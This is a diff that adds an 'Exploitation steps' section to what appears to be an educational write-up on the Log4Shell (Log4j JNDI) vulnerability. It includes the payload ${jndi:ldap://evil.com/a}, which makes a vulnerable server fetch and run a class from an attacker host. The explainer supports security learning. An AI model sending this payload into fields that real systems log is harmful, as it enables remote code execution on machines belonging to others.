@@ -50,3 +50,20 @@ Log4j wouldn't treat this as text. It would interpret it and actually make a net
 
 3. The impact was full remotecode execution.
 4. Attackers were mass scanning the internet within hours of disclosure.
+
+## Exploitation steps.
+
+1. **Victim application logs a user-controlled value**
+
+   (eg: Username, HTTP Header, Chat message)
+
+2. **Attacker sends:**
+   ```bash
+   ${jndi:ldap://evil.com/a}
+   ```
+3. Log4j interprets it
+   reaches out to attacker server through JNDI
+
+4. **Attacker responds with malicious class**
+   - Java loads and executes it
+   - Full compromise
